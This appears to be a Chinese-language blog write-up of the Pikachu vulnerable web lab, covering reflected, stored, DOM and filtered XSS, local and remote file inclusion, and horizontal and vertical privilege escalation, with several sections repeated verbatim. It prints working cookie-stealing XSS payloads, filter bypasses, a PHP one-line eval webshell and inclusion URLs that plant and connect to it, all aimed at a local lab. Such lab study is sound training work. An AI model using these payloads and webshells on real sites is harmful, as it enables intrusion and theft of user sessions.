​ XSS是一种发生在前端浏览器端的漏洞，所以其危害的对象也是前端用户。 形成XSS漏洞的主要原因是程序对输入和输出没有做合适的处理，导致“精心构造”的字符输出在前端时被浏览器当作有效代码解析执行从而产生危害。 ​ 在XSS漏洞的防范上，一般会采用“对输入进行过滤”和“输出进行转义”的方式进行处理: 输入过滤：对输入进行过滤，不允许可能导致XSS攻击的字符输入; 输出转义：根据输出点的位置对输出到前端的内容进行适当转义; ​ XSS测试流程 1、在目标上找输入点，比如查询接口、留言板 2、 输入一组 “特殊字符（\u003e，’，“等）+唯一识别字符” ，点击提交后，查看返回源码，看后端返回的数据是否有处理 3、通过搜索定位到唯一字符，结合唯一字符前后语法确定是否可以构造执行js的条件（构造闭合） 4、 提交构造的脚本代码（以及各种绕过姿势），看是否可以成功执行，如果成功执行则说明存在XSS漏洞 ","date":"2023-11-17","objectID":"/pikachu_range_summary/:0:0","series":null,"tags":["web","wp"],"title":"Pikachu靶场汇总","uri":"/pikachu_range_summary/#cross-site-scripting"},{"categories":["web","wp"],"content":"\r反射型xss(get)\r蓝色框中包含对文本框最大长度的限制，可进行修改 随后输入xss弹框代码： \u003cscript\u003ealert(1)\u003c/script\u003e Xss回显： ","date":"2023-11-17","objectID":"/pikachu_range_summary/:0:1","series":null,"tags":["web","wp"],"title":"Pikachu靶场汇总","uri":"/pikachu_range_summary/#反射型xssget"},{"categories":["web","wp"],"content":"\r反射性xss(post)先登录，再输入弹cookie的Xss代码，爆破比较常规 \u003cscript\u003ealert(document.cookie)\u003c/script\u003e 回显： ","date":"2023-11-17","objectID":"/pikachu_range_summary/:0:2","series":null,"tags":["web","wp"],"title":"Pikachu靶场汇总","uri":"/pikachu_range_summary/#反射性xsspost"},{"categories":["web","wp"],"content":"\r存储型xss\r","date":"2023-11-17","objectID":"/pikachu_range_summary/:0:3","series":null,"tags":["web","wp"],"title":"Pikachu靶场汇总","uri":"/pikachu_range_summary/#存储型xss"},{"categories":["web","wp"],"content":"\rDom型XssDom型xss，就是向文档对象传入xss代码参数，然后操作文档对象时就会触发xss攻击。DOM型xss是比较特殊的，产生DOM型xss的原因是DOM获取到了前端的输入并载入到DOM节点中作为输出，相比与反射型和存储型，它是不与后端交互的 分析一下前端网页代码，可以发现输入框里的参数会被传递给A标签的href属性 点击按钮后，输入框参数被传到a标签的href属性，只要将href属性弄成xss代码，即可触发xss 下面摘取大佬的写的wp(验证过程)： 1.先检测一下输入输出，输入 123 ,查看页面 2.可以看到，页面中出现了双引号，需要进行闭合，输入 123” οnclick=alert(1) ，再查看源代码。 3.再继续进行输入检测，输入 123\" οnclick=alert(1) \u003c\u003e ’ \" ，出现如下结果 4.输入 123\" οnclick=alert(1) \u003c\u003e ’ ， 5.看得有点迷糊，但是可以发现，双引号被当成了普通的字符串，而单引号却没有，甚至，会在单引号前边自动加上一个双引号。 6.审查一下源代码 \u003cdiv id=\"xssd_main\"\u003e \u003cscript\u003e function domxss(){ var str = document.getElementById(\"text\").value; //通过id获取到输入框中的值，并赋值给str document.getElementById(\"dom\").innerHTML = \"\u003ca href='\"+str+\"'\u003ewhat do you see?\u003c/a\u003e\"; //在id=“dom”的起止标签中间插入一个\u003ca\u003e标签，并将输入框中获取到的字符串拼接到\u003ca\u003e标签里面 //所以，要想闭合，实际上需要用的是单引号 //123\" οnclick=alert(1) \u003c\u003e ' \u003ca href='123\" onclick=alert(1) \u003c\u003e ''\u003ewhat do you see?\u003c/a\u003e } //试试：'\u003e\u003cimg src=\"#\" οnmοuseοver=\"alert('xss')\"\u003e //试试：' οnclick=\"alert('xss')\"\u003e,闭合掉就行 \u003c/script\u003e \u003c!--\u003ca href=\"\" onclick=('xss')\u003e--\u003e \u003cinput id=\"text\" name=\"text\" type=\"text\" value=\"\" /\u003e \u003cinput id=\"button\" type=\"button\" value=\"click me!\" onclick=\"domxss()\" /\u003e \u003cdiv id=\"dom\"\u003e\u003c/div\u003e \u003c/div\u003e 7.使用单引号闭合，或者是使用JavaScript伪协议，输入 javascript:alert(1),至于更深层次的利用方法，现在暂时不了解，留待学习JavaScript后加强 ","date":"2023-11-17","objectID":"/pikachu_range_summary/:0:4","series":null,"tags":["web","wp"],"title":"Pikachu靶场汇总","uri":"/pikachu_range_summary/#dom型xss"},{"categories":["web","wp"],"content":"\rDOM型xss-X单纯解题角度，无非是比上一题要多点一下 抄抄大佬的分析： 按照上一关的方法直接就成功了，而且测试了一下，闭合单引号以后，后边的双引号是可以正常使用的。 输入 #’ οnclick=“alert(‘1’)”\u003e 但还是来审查一波源代码，走一个流程。这个程序的执行，总共有着三个步骤。 1.在输入框中输入数据，点下按钮，表单以get方式提交，但明没有页面跳转，仅是将数据加载到url中 \u003cform method=\"get\"\u003e \u003cinput id=\"text\" name=\"text\" type=\"text\" value=\"\" /\u003e \u003cinput id=\"submit\" type=\"submit\" value=\"请说出你的伤心往事\"/\u003e \u003c/form\u003e 2.下面一段代码检测，url中是否设置了“text参数”，如果设置了，就会在页面中增加一个超链接的DOM节点。 $html=''; if(isset($_GET['text'])){ $html.= \"\u003ca href='#' οnclick='domxss()'\u003e有些费尽心机想要忘记的事情,后来真的就忘掉了\u003c/a\u003e\"; } 3.点击超链接，触发onclick事件，调用domxss()函数。读取url后的参数，截取除“?text=”的部分，并解码，再使用正则表达式将url中出现的\\全局替换为空格，最后将得出的payload拼接到标签中。 Location.search Location的search属性是一个可读可写的字符串，可设置或返回当前 URL 的查询部分（问号?之后的部分）。 decodeURIComponent 对 encodeURIComponent() 函数编码的 URI 进行解码 string.split(separator,limit) separator 可选。字符串或正则表达式，从该参数指定的地方分割 string Object。 limit 可选。该参数可指定返回的数组的最大长度。如果设置了该参数，返回的子串不会多于这个参数指定的数组。如果没有设置该参数，整个字符串都会被分割，不考虑它的长度。 原文链接：https://blog.csdn.net/weixin_44178492/article/details/108959980 \u003cscript\u003e function domxss() { var str = window.location.search; var txss = decodeURIComponent(str.split(\"text=\")[1]); var xss = txss.replace(/\\+/g,' '); //alert(xss); document.getElementById(\"dom\").innerHTML = \"\u003ca href='\"+xss+\"'\u003e就让往事都随风,都随风吧\u003c/a\u003e\"; } //试试：'\u003e\u003cimg src=\"#\" onmouseover=\"alert('xss')\"\u003e //试试：' οnclick=\"alert('xss')\"\u003e,闭合掉就行 \u003c/script\u003e 不得不说，chatgpt分析代码真好用啊","date":"2023-11-17","objectID":"/pikachu_range_summary/:0:5","series":null,"tags":["web","wp"],"title":"Pikachu靶场汇总","uri":"/pikachu_range_summary/#dom型xss-x"},{"categories":["web","wp"],"content":"\rDOM型xss-X单纯解题角度，无非是比上一题要多点一下 抄抄大佬的分析： 按照上一关的方法直接就成功了，而且测试了一下，闭合单引号以后，后边的双引号是可以正常使用的。 输入 #’ οnclick=“alert(‘1’)”\u003e 但还是来审查一波源代码，走一个流程。这个程序的执行，总共有着三个步骤。 1.在输入框中输入数据，点下按钮，表单以get方式提交，但明没有页面跳转，仅是将数据加载到url中 2.下面一段代码检测，url中是否设置了“text参数”，如果设置了，就会在页面中增加一个超链接的DOM节点。 $html=''; if(isset($_GET['text'])){ $html.= \"有些费尽心机想要忘记的事情,后来真的就忘掉了\"; } 3.点击超链接，触发onclick事件，调用domxss()函数。读取url后的参数，截取除“?text=”的部分，并解码，再使用正则表达式将url中出现的\\全局替换为空格，最后将得出的payload拼接到标签中。 Location.search Location的search属性是一个可读可写的字符串，可设置或返回当前 URL 的查询部分（问号?之后的部分）。 decodeURIComponent 对 encodeURIComponent() 函数编码的 URI 进行解码 string.split(separator,limit) separator 可选。字符串或正则表达式，从该参数指定的地方分割 string Object。 limit 可选。该参数可指定返回的数组的最大长度。如果设置了该参数，返回的子串不会多于这个参数指定的数组。如果没有设置该参数，整个字符串都会被分割，不考虑它的长度。 原文链接：https://blog.csdn.net/weixin_44178492/article/details/108959980 不得不说，chatgpt分析代码真好用啊","date":"2023-11-17","objectID":"/pikachu_range_summary/:0:5","series":null,"tags":["web","wp"],"title":"Pikachu靶场汇总","uri":"/pikachu_range_summary/#不得不说chatgpt分析代码真好用啊"},{"categories":["web","wp"],"content":"\rxss之盲打输入内容提交，发现没回显，直接dirsearch扫描一下后台，可得到后台登录地址 http://127.0.0.1/vul/xss/xssblind/admin_login.php 随后bp爆破进入，可看到历次提交的内容，就此，我们可以尝试提交xss语句，刷新后台页面，有回显 ","date":"2023-11-17","objectID":"/pikachu_range_summary/:0:6","series":null,"tags":["web","wp"],"title":"Pikachu靶场汇总","uri":"/pikachu_range_summary/#xss之盲打"},{"categories":["web","wp"],"content":"\rXss之过滤看一下源代码 if(isset($_GET['submit']) \u0026\u0026 $_GET['message'] != null){ //这里会使用正则对\u003cscript进行替换为空,也就是过滤掉 $message=preg_replace('/\u003c(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/', '', $_GET['message']); // $message=str_ireplace('\u003cscript\u003e',$_GET['message']); 过滤掉了\u003cscript字段 ，可以尝试大小写绕过 \u003cScript\u003ealert(document.cookie)\u003c/sCript\u003e 当然其他语句是不受影响的 \u003cimg src='x' onerror='alert(document.cookie)'\u003e ","date":"2023-11-17","objectID":"/pikachu_range_summary/:0:7","series":null,"tags":["web","wp"],"title":"Pikachu靶场汇总","uri":"/pikachu_range_summary/#xss之过滤"},{"categories":["web","wp"],"content":"\rxss之htmlspecialcharshtmlspecialchars() 函数把一些预定义的字符转换为 HTML 实体。语法为：htmlspecialchars(string,quotestyle,character-set) specialchars这个函数就是把单引号，双引号，尖括号过滤了，但是这个函数默认是不过滤单引号的，只有将quotestyle选项为ENT_QUOTES才会过滤单引号。 所以用javascript:alert(document.cookie)就可以绕过 ","date":"2023-11-17","objectID":"/pikachu_range_summary/:0:8","series":null,"tags":["web","wp"],"title":"Pikachu靶场汇总","uri":"/pikachu_range_summary/#xss之htmlspecialchars"},{"categories":["web","wp"],"content":"\rxss之href输出此关，同时使用了htmlspecialchars并且使用了ENT_QUOTES参数 ENT_COMPAT - 默认，仅编码双引号。 ENT_QUOTES - 编码双引号和单引号。 ENT_NOQUOTES - 不编码任何引号。 看源码 $message=htmlspecialchars($_GET['message'],ENT_QUOTES); 所以，使用单引号是无法进行绕过的，只能使用JavaScript伪协议了。 javascript:alert(document.cookie) ","date":"2023-11-17","objectID":"/pikachu_range_summary/:0:9","series":null,"tags":["web","wp"],"title":"Pikachu靶场汇总","uri":"/pikachu_range_summary/#xss之href输出"},{"categories":["web","wp"],"content":"\rxss之js输出看源代码，这段判断提交的参数并获取，如果参数值为“tmac”，则输出一张图片 if(isset($_GET['submit']) \u0026\u0026 $_GET['message'] !=null){ $jsvar=$_GET['message']; // $jsvar=htmlspecialchars($_GET['message'],ENT_QUOTES); if($jsvar == 'tmac'){ $html.=\"\u003cimg src='C:\\Blog\\source\\_posts\\{$PIKA_ROOT_DIR}assets\\images\\nbaplayer\\tmac.jpeg' /\u003e\"; } } 下面这段： \u003cscript\u003e $ms='\u003c?php echo $jsvar;?\u003e'; if($ms.length != 0){ if($ms == 'tmac'){ $('#fromjs').text('tmac确实厉害,看那小眼神..') }else { // alert($ms); $('#fromjs').text('无论如何不要放弃心中所爱..') } } \u003c/script\u003e //这里将输入动态的生成到了js中,形成xss //javascript里面是不会对tag和字符实体进行解释的,所以需要进行js转义 //讲这个例子主要是为了让你明白,输出点在js中的xss问题,应该怎么修复? //这里如果进行html的实体编码,虽然可以解决XSS的问题,但是实体编码后的内容,在JS里面不会进行翻译,这样会导致前端的功能无法使用。 //所以在JS的输出点应该使用\\对特殊字符进行转义 则构造payload如下： \u003c/script\u003e\u003cscript\u003ealert(1)\u003c/script\u003e ","date":"2023-11-17","objectID":"/pikachu_range_summary/:0:10","series":null,"tags":["web","wp"],"title":"Pikachu靶场汇总","uri":"/pikachu_range_summary/#xss之js输出"},{"categories":["web","wp"],"content":"\rFile Inclusion​ 文件包含是一个功能。在各种开发语言中都提供了内置的文件包含函数，其可以使开发人员在一个代码文件中直接包含（引入）另外一个代码文件。 比如 在PHP中，提供了： include(),include_once() require(),require_once() ​ 大多数情况下，文件包含函数中包含的代码文件是固定的，因此也不会出现安全问题。 若文件包含的代码文件被写成了一个变量，且这个变量可以由前端用户传进来，这种情况下，可能会引发文件包含漏洞。 攻击着会指定一个“意想不到”的文件让包含函数去执行，从而造成恶意操作。 根据不同的配置环境，文件包含漏洞分为如下两种情况： ​ **1.本地文件包含漏洞：**仅能够对服务器本地的文件进行包含，由于服务器上的文件并不是攻击者所能够控制的，因此该情况下，攻击着更多的会包含一些 固定的系统配置文件，从而读取系统敏感信息。很多时候本地文件包含漏洞会结合一些特殊的文件上传漏洞，从而形成更大的威力。 ​ **2.远程文件包含漏洞：**能够通过url地址对远程的文件进行包含，这意味着攻击者可以传入任意的代码，这种情况没啥好说的，准备挂彩。 因此，在web应用系统的功能设计上尽量不要让前端用户直接传变量给包含函数，如果非要这么做，也一定要做严格的白名单策略进行过滤。 ","date":"2023-11-17","objectID":"/pikachu_range_summary/:0:0","series":null,"tags":["web","wp"],"title":"Pikachu靶场汇总","uri":"/pikachu_range_summary/#file-inclusion"},{"categories":["web","wp"],"content":"\rFile Inclusion(local)\r原理仅对服务器本地的文件进行包含, 由于服务器上的文件并不是攻击者所能控制得, 因此在攻击的过程中更多的是包含系统的配置文件(如密钥文件), 或者配合文件上传漏洞去形成更大的威力 通过get传参，file伪协议，直接对payload进行修改 再举一个栗子，这里我摘取一下charmersix师傅的笔记： 我们在目录下新建个txt,一会通过web页面读它\r然后我们直接在url里输入目录就可以\r在CSDN看到了大佬写的笔记，觉得在理解本地文件包含上大有益俾，赶紧抄一抄： 出自Henry404s师傅 访问任意文件在当前网页所在的文件目录有一个file6.php文件 读取file6.php文件内容:http://127.0.0.1/pikachu/vul/fileinclude/fi_local.php?filename=file6.php\u0026submit=%E6%8F%90%E4%BA%A4%E6%9F%A5%E8%AF%A2 配合文件上传getshell使用imgTrjs工具将一句话代码写入图片中 \u003c?php @eval($_POST['123']);?\u003e 在文件上传处上传带有恶意代码的图片, 随后返回图片的相对路径:uploads/ImgTrjs.jpg 包含不存在的文件导致报错:http://127.0.0.1/pikachu/vul/fileinclude/fi_local.php?filename=file7.php\u0026submit=%E6%8F%90%E4%BA%A4%E6%9F%A5%E8%AF%A2 从报错信息可看出文件包含函数用的是include(), 被包含的文件路径为pikachu\\vul\\fileinclude\\include\\file7.php 由于文件处于/include目录下, 故不能使用绝对路径, 需转换成相对路径, 最终包含木马图片的payload如下 http://127.0.0.1/pikachu/vul/fileinclude/fi_local.php?filename=../../unsafeupload/uploads/ImgTrjs.jpg\u0026submit=%E6%8F%90%E4%BA%A4%E6%9F%A5%E8%AF%A2 使用蚁剑连接webshell, 连接url地址为:http://127.0.0.1/pikachu/vul/fileinclude/fi_local.php?filename=../../unsafeupload/uploads/ImgTrjs.jpg\u0026submit=%E6%8F%90%E4%BA%A4%E6%9F%A5%E8%AF%A2, 连接密码为123 ","date":"2023-11-17","objectID":"/pikachu_range_summary/:0:1","series":null,"tags":["web","wp"],"title":"Pikachu靶场汇总","uri":"/pikachu_range_summary/#file-inclusionlocal"},{"categories":["web","wp"],"content":"\rFile Inclusion(local)\r原理仅对服务器本地的文件进行包含, 由于服务器上的文件并不是攻击者所能控制得, 因此在攻击的过程中更多的是包含系统的配置文件(如密钥文件), 或者配合文件上传漏洞去形成更大的威力 通过get传参，file伪协议，直接对payload进行修改 再举一个栗子，这里我摘取一下charmersix师傅的笔记： 我们在目录下新建个txt,一会通过web页面读它\r然后我们直接在url里输入目录就可以\r在CSDN看到了大佬写的笔记，觉得在理解本地文件包含上大有益俾，赶紧抄一抄： 出自Henry404s师傅 访问任意文件在当前网页所在的文件目录有一个file6.php文件 读取file6.php文件内容:http://127.0.0.1/pikachu/vul/fileinclude/fi_local.php?filename=file6.php\u0026submit=%E6%8F%90%E4%BA%A4%E6%9F%A5%E8%AF%A2 配合文件上传getshell使用imgTrjs工具将一句话代码写入图片中 \u003c?php @eval($_POST['123']);?\u003e 在文件上传处上传带有恶意代码的图片, 随后返回图片的相对路径:uploads/ImgTrjs.jpg 包含不存在的文件导致报错:http://127.0.0.1/pikachu/vul/fileinclude/fi_local.php?filename=file7.php\u0026submit=%E6%8F%90%E4%BA%A4%E6%9F%A5%E8%AF%A2 从报错信息可看出文件包含函数用的是include(), 被包含的文件路径为pikachu\\vul\\fileinclude\\include\\file7.php 由于文件处于/include目录下, 故不能使用绝对路径, 需转换成相对路径, 最终包含木马图片的payload如下 http://127.0.0.1/pikachu/vul/fileinclude/fi_local.php?filename=../../unsafeupload/uploads/ImgTrjs.jpg\u0026submit=%E6%8F%90%E4%BA%A4%E6%9F%A5%E8%AF%A2 使用蚁剑连接webshell, 连接url地址为:http://127.0.0.1/pikachu/vul/fileinclude/fi_local.php?filename=../../unsafeupload/uploads/ImgTrjs.jpg\u0026submit=%E6%8F%90%E4%BA%A4%E6%9F%A5%E8%AF%A2, 连接密码为123 ","date":"2023-11-17","objectID":"/pikachu_range_summary/:0:1","series":null,"tags":["web","wp"],"title":"Pikachu靶场汇总","uri":"/pikachu_range_summary/#原理"},{"categories":["web","wp"],"content":"\rFile Inclusion(local)\r原理仅对服务器本地的文件进行包含, 由于服务器上的文件并不是攻击者所能控制得, 因此在攻击的过程中更多的是包含系统的配置文件(如密钥文件), 或者配合文件上传漏洞去形成更大的威力 通过get传参，file伪协议，直接对payload进行修改 再举一个栗子，这里我摘取一下charmersix师傅的笔记： 我们在目录下新建个txt,一会通过web页面读它\r然后我们直接在url里输入目录就可以\r在CSDN看到了大佬写的笔记，觉得在理解本地文件包含上大有益俾，赶紧抄一抄： 出自Henry404s师傅 访问任意文件在当前网页所在的文件目录有一个file6.php文件 读取file6.php文件内容:http://127.0.0.1/pikachu/vul/fileinclude/fi_local.php?filename=file6.php\u0026submit=%E6%8F%90%E4%BA%A4%E6%9F%A5%E8%AF%A2 配合文件上传getshell使用imgTrjs工具将一句话代码写入图片中 \u003c?php @eval($_POST['123']);?\u003e 在文件上传处上传带有恶意代码的图片, 随后返回图片的相对路径:uploads/ImgTrjs.jpg 包含不存在的文件导致报错:http://127.0.0.1/pikachu/vul/fileinclude/fi_local.php?filename=file7.php\u0026submit=%E6%8F%90%E4%BA%A4%E6%9F%A5%E8%AF%A2 从报错信息可看出文件包含函数用的是include(), 被包含的文件路径为pikachu\\vul\\fileinclude\\include\\file7.php 由于文件处于/include目录下, 故不能使用绝对路径, 需转换成相对路径, 最终包含木马图片的payload如下 http://127.0.0.1/pikachu/vul/fileinclude/fi_local.php?filename=../../unsafeupload/uploads/ImgTrjs.jpg\u0026submit=%E6%8F%90%E4%BA%A4%E6%9F%A5%E8%AF%A2 使用蚁剑连接webshell, 连接url地址为:http://127.0.0.1/pikachu/vul/fileinclude/fi_local.php?filename=../../unsafeupload/uploads/ImgTrjs.jpg\u0026submit=%E6%8F%90%E4%BA%A4%E6%9F%A5%E8%AF%A2, 连接密码为123 ","date":"2023-11-17","objectID":"/pikachu_range_summary/:0:1","series":null,"tags":["web","wp"],"title":"Pikachu靶场汇总","uri":"/pikachu_range_summary/#heading"},{"categories":["web","wp"],"content":"\rFile Inclusion(local)\r原理仅对服务器本地的文件进行包含, 由于服务器上的文件并不是攻击者所能控制得, 因此在攻击的过程中更多的是包含系统的配置文件(如密钥文件), 或者配合文件上传漏洞去形成更大的威力 通过get传参，file伪协议，直接对payload进行修改 再举一个栗子，这里我摘取一下charmersix师傅的笔记： 我们在目录下新建个txt,一会通过web页面读它\r然后我们直接在url里输入目录就可以\r在CSDN看到了大佬写的笔记，觉得在理解本地文件包含上大有益俾，赶紧抄一抄： 出自Henry404s师傅 访问任意文件在当前网页所在的文件目录有一个file6.php文件 读取file6.php文件内容:http://127.0.0.1/pikachu/vul/fileinclude/fi_local.php?filename=file6.php\u0026submit=%E6%8F%90%E4%BA%A4%E6%9F%A5%E8%AF%A2 配合文件上传getshell使用imgTrjs工具将一句话代码写入图片中 \u003c?php @eval($_POST['123']);?\u003e 在文件上传处上传带有恶意代码的图片, 随后返回图片的相对路径:uploads/ImgTrjs.jpg 包含不存在的文件导致报错:http://127.0.0.1/pikachu/vul/fileinclude/fi_local.php?filename=file7.php\u0026submit=%E6%8F%90%E4%BA%A4%E6%9F%A5%E8%AF%A2 从报错信息可看出文件包含函数用的是include(), 被包含的文件路径为pikachu\\vul\\fileinclude\\include\\file7.php 由于文件处于/include目录下, 故不能使用绝对路径, 需转换成相对路径, 最终包含木马图片的payload如下 http://127.0.0.1/pikachu/vul/fileinclude/fi_local.php?filename=../../unsafeupload/uploads/ImgTrjs.jpg\u0026submit=%E6%8F%90%E4%BA%A4%E6%9F%A5%E8%AF%A2 使用蚁剑连接webshell, 连接url地址为:http://127.0.0.1/pikachu/vul/fileinclude/fi_local.php?filename=../../unsafeupload/uploads/ImgTrjs.jpg\u0026submit=%E6%8F%90%E4%BA%A4%E6%9F%A5%E8%AF%A2, 连接密码为123 ","date":"2023-11-17","objectID":"/pikachu_range_summary/:0:1","series":null,"tags":["web","wp"],"title":"Pikachu靶场汇总","uri":"/pikachu_range_summary/#访问任意文件"},{"categories":["web","wp"],"content":"\rFile Inclusion(local)\r原理仅对服务器本地的文件进行包含, 由于服务器上的文件并不是攻击者所能控制得, 因此在攻击的过程中更多的是包含系统的配置文件(如密钥文件), 或者配合文件上传漏洞去形成更大的威力 通过get传参，file伪协议，直接对payload进行修改 再举一个栗子，这里我摘取一下charmersix师傅的笔记： 我们在目录下新建个txt,一会通过web页面读它\r然后我们直接在url里输入目录就可以\r在CSDN看到了大佬写的笔记，觉得在理解本地文件包含上大有益俾，赶紧抄一抄： 出自Henry404s师傅 访问任意文件在当前网页所在的文件目录有一个file6.php文件 读取file6.php文件内容:http://127.0.0.1/pikachu/vul/fileinclude/fi_local.php?filename=file6.php\u0026submit=%E6%8F%90%E4%BA%A4%E6%9F%A5%E8%AF%A2 配合文件上传getshell使用imgTrjs工具将一句话代码写入图片中 \u003c?php @eval($_POST['123']);?\u003e 在文件上传处上传带有恶意代码的图片, 随后返回图片的相对路径:uploads/ImgTrjs.jpg 包含不存在的文件导致报错:http://127.0.0.1/pikachu/vul/fileinclude/fi_local.php?filename=file7.php\u0026submit=%E6%8F%90%E4%BA%A4%E6%9F%A5%E8%AF%A2 从报错信息可看出文件包含函数用的是include(), 被包含的文件路径为pikachu\\vul\\fileinclude\\include\\file7.php 由于文件处于/include目录下, 故不能使用绝对路径, 需转换成相对路径, 最终包含木马图片的payload如下 http://127.0.0.1/pikachu/vul/fileinclude/fi_local.php?filename=../../unsafeupload/uploads/ImgTrjs.jpg\u0026submit=%E6%8F%90%E4%BA%A4%E6%9F%A5%E8%AF%A2 使用蚁剑连接webshell, 连接url地址为:http://127.0.0.1/pikachu/vul/fileinclude/fi_local.php?filename=../../unsafeupload/uploads/ImgTrjs.jpg\u0026submit=%E6%8F%90%E4%BA%A4%E6%9F%A5%E8%AF%A2, 连接密码为123 ","date":"2023-11-17","objectID":"/pikachu_range_summary/:0:1","series":null,"tags":["web","wp"],"title":"Pikachu靶场汇总","uri":"/pikachu_range_summary/#配合文件上传getshell"},{"categories":["web","wp"],"content":"\rFile inclusion(Remote)\r原理能通过url地址对远程的文件进行包含, 这也意味着攻击者可以传入任意的代码 与此同时远程包含漏洞还能包含本地文件的绝对路径或相对路径 远程文件包含涉及到两个配置选项 allow_url_fopen = On 是否允许打开远程文件 allow_url_include = On 是否允许include/require远程文件 同样摘取Henry404s师傅的文章： 远程生成Webshell首先生成一个文本文件部署在服务器上，这里为了测试方便，我选择放在phpstudy的根目录下，文件内容为 \u003c?php fputs(fopen('shell.php','w'),'\u003c?php @eval($_POST[123]);?\u003e');?\u003e 文件的url地址为 http://127.0.0.1/GenerateWebshell.txt 最终构成的远程包含payload为http://127.0.0.1/pikachu/vul/fileinclude/fi_remote.php?filename=http://127.0.0.1/GenerateWebshell.txt\u0026submit=%E6%8F%90%E4%BA%A4%E6%9F%A5%E8%AF%A2 网页访问该payload后会在fi_remote.php的同级目录下生成shell.php文件, 后续可用蚁剑进行连接 ","date":"2023-11-17","objectID":"/pikachu_range_summary/:0:2","series":null,"tags":["web","wp"],"title":"Pikachu靶场汇总","uri":"/pikachu_range_summary/#file-inclusionremote"},{"categories":["web","wp"],"content":"\rFile inclusion(Remote)\r原理能通过url地址对远程的文件进行包含, 这也意味着攻击者可以传入任意的代码 与此同时远程包含漏洞还能包含本地文件的绝对路径或相对路径 远程文件包含涉及到两个配置选项 allow_url_fopen = On 是否允许打开远程文件 allow_url_include = On 是否允许include/require远程文件 同样摘取Henry404s师傅的文章： 远程生成Webshell首先生成一个文本文件部署在服务器上，这里为了测试方便，我选择放在phpstudy的根目录下，文件内容为 \u003c?php fputs(fopen('shell.php','w'),'\u003c?php @eval($_POST[123]);?\u003e');?\u003e 文件的url地址为 http://127.0.0.1/GenerateWebshell.txt 最终构成的远程包含payload为http://127.0.0.1/pikachu/vul/fileinclude/fi_remote.php?filename=http://127.0.0.1/GenerateWebshell.txt\u0026submit=%E6%8F%90%E4%BA%A4%E6%9F%A5%E8%AF%A2 网页访问该payload后会在fi_remote.php的同级目录下生成shell.php文件, 后续可用蚁剑进行连接 ","date":"2023-11-17","objectID":"/pikachu_range_summary/:0:2","series":null,"tags":["web","wp"],"title":"Pikachu靶场汇总","uri":"/pikachu_range_summary/#原理-1"},{"categories":["web","wp"],"content":"\rFile inclusion(Remote)\r原理能通过url地址对远程的文件进行包含, 这也意味着攻击者可以传入任意的代码 与此同时远程包含漏洞还能包含本地文件的绝对路径或相对路径 远程文件包含涉及到两个配置选项 allow_url_fopen = On 是否允许打开远程文件 allow_url_include = On 是否允许include/require远程文件 同样摘取Henry404s师傅的文章： 远程生成Webshell首先生成一个文本文件部署在服务器上，这里为了测试方便，我选择放在phpstudy的根目录下，文件内容为 \u003c?php fputs(fopen('shell.php','w'),'\u003c?php @eval($_POST[123]);?\u003e');?\u003e 文件的url地址为 http://127.0.0.1/GenerateWebshell.txt 最终构成的远程包含payload为http://127.0.0.1/pikachu/vul/fileinclude/fi_remote.php?filename=http://127.0.0.1/GenerateWebshell.txt\u0026submit=%E6%8F%90%E4%BA%A4%E6%9F%A5%E8%AF%A2 网页访问该payload后会在fi_remote.php的同级目录下生成shell.php文件, 后续可用蚁剑进行连接 ","date":"2023-11-17","objectID":"/pikachu_range_summary/:0:2","series":null,"tags":["web","wp"],"title":"Pikachu靶场汇总","uri":"/pikachu_range_summary/#远程生成webshell"},{"categories":["web","wp"],"content":"\rOver Permission​ 如果使用A用户的权限去操作B用户的数据，A的权限小于B的权限，如果能够成功操作，则称之为越权操作。 越权漏洞形成的原因是后台使用了 不合理的权限校验规则导致的。 ​ 一般越权漏洞容易出现在权限页面（需要登录的页面）增、删、改、查的的地方，当用户对权限页面内的信息进行这些操作时，后台需要对 对当前用户的权限进行校验，看其是否具备操作的权限，从而给出响应，而如果校验的规则过于简单则容易出现越权漏洞。 ​ 越权漏洞又分为水平越权和垂直越权: 水平越权: A用户和B用户属于同一级别的用户, 但各自都不能操作对方的个人信息。若A用户能够越权操作B用户的个人信息, 这种情况我们称之为\"水平越权\" 垂直越权: A用户权限高于B用户, B用户能对A用户进行操作的情况称为\"垂直越权\" ","date":"2023-11-17","objectID":"/pikachu_range_summary/:0:0","series":null,"tags":["web","wp"],"title":"Pikachu靶场汇总","uri":"/pikachu_range_summary/#over-permission"},{"categories":["web","wp"],"content":"\r水平越权\r​ 根据提示，登录lili的账号，进入查看个人信息页面，通过修改url，可查看并更改kobe，lucy的信息，存在水平越权漏洞 ​ 本关涉及到两个页面，一个是登录页面，另一个是用户信息的页面,而越权漏洞出现在查看用户信息的页面中，在进行校验时，仅校验了传进来的username，导致了漏洞 ","date":"2023-11-17","objectID":"/pikachu_range_summary/:0:1","series":null,"tags":["web","wp"],"title":"Pikachu靶场汇总","uri":"/pikachu_range_summary/#水平越权"},{"categories":["web","wp"],"content":"\r垂直越权​ 两个账号，一个是admin(高权限),另一个是pikachu(低权限)，在进行登录时会有两个数据包，第一个是登录的数据包，第二个是请求页面的数据包 此处摘取Henry404s师傅的分析： 通过源代码分析流程 1.首先是登录页面，用户提交信息，脚本从数据库中进行查询，对应的表中总共有3个字段，username，password，level，查询到数据之后，对level的值进行校验，然后签发session，并跳转到不同的页面。 $html=\"\"; if(isset($_POST['submit'])){ if($_POST['username']!=null \u0026\u0026 $_POST['password']!=null){ $username=escape($link, $_POST['username']); $password=escape($link, $_POST['password']);//转义，防注入 $query=\"select * from users where username='$username' and password=md5('$password')\"; $result=execute($link, $query); if(mysqli_num_rows($result)==1){ $data=mysqli_fetch_assoc($result); if($data['level']==1){//如果级别是1，进入admin.php $_SESSION['op2']['username']=$username; $_SESSION['op2']['password']=sha1(md5($password)); $_SESSION['op2']['level']=1; header(\"location:op2_admin.php\"); } if($data['level']==2){//如果级别是2，进入user.php $_SESSION['op2']['username']=$username; $_SESSION['op2']['password']=sha1(md5($password)); $_SESSION['op2']['level']=2; header(\"location:op2_user.php\"); } }else{ //查询不到，登录失败 $html.=\"\u003cp\u003e登录失败,请重新登录\u003c/p\u003e\"; } } } 2.接着是管理员页面，管理员页面中只要提交了id参数就可以完成一次删除操作，但是，此处校验较为严格，不存在越权漏洞。(至少我找不到) $link=connect(); // 判断是否登录，没有登录不能访问 //如果没登录，或者level不等于1，都就干掉 if(!check_op2_login($link) || $_SESSION['op2']['level']!=1){ header(\"location:op2_login.php\"); exit(); } //删除 if(isset($_GET['id'])){ $id=escape($link, $_GET['id']);//转义 $query=\"delete from member where id={$id}\"; execute($link, $query); } if(isset($_GET['logout']) \u0026\u0026 $_GET['logout'] == 1){ session_unset(); session_destroy(); setcookie(session_name(),'',time()-3600,'/'); 